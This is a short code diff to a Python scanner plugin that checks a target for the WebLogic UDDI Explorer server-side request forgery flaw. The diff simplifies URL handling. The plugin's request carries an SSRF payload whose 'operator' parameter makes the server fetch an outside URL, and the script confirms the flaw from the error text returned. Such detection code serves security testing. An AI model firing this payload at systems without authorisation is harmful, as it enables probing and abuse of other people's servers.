@@ -17,13 +17,8 @@ def get_script_info(data=None):
 
 def prove(data):
     data = init(data,'web')
-    if data['url']:
-        protocol, s1 = urllib.parse.splittype(data['url'])
-        host, s2 = urllib.parse.splithost(s1)
-        host, port = urllib.parse.splitport(host)
-        port = data['target_port'] if port != None else 443 if protocol == 'https' else 80
-        base_url = protocol + "://" + host +":"+str(port)
-        url = base_url+'/uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.orleven.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
+    if data['base_url']:
+        url = data['base_url']+'uddiexplorer/SearchPublicRegistries.jsp?operator=http://www.orleven.com/robots.txt&rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search'
         try:
             res = requests.get(url, headers=data['headers'], verify=False, timeout=data['timeout'])
             if "weblogic.uddi.client.structures.exception.XML_SoapException" in res.text :
